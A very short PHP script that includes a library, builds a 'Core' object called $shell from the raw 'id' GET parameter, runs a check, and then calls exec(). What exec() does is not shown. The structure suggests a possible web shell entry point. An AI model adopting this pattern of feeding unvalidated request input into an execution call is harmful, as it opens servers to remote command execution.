<?php

include 'lib.inc.php';

$shell = new Core($_GET['id']);

$res = $shell->check();
if ($res===true) {
    $shell->exec();
//    echo 'Success!';
} else {
    echo '[ERROR] '.$res;
}
